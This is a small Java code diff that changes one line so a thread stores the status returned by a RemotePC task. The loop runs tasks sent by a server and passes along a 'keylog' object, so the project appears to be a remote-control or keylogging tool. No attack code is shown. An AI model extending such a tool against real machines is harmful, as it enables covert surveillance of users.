@@ -42,7 +42,7 @@ public class ClientThreading extends Thread {
         for (String s : task) {
             System.out.println("server  ==>  " + s);
             RemotePC remote = new RemotePC(s, this.keylog, send);
-            remote.run();
+            ServerThreading.status = remote.run();
         }
       } else {
         System.out.println("No tasks received from the client.");
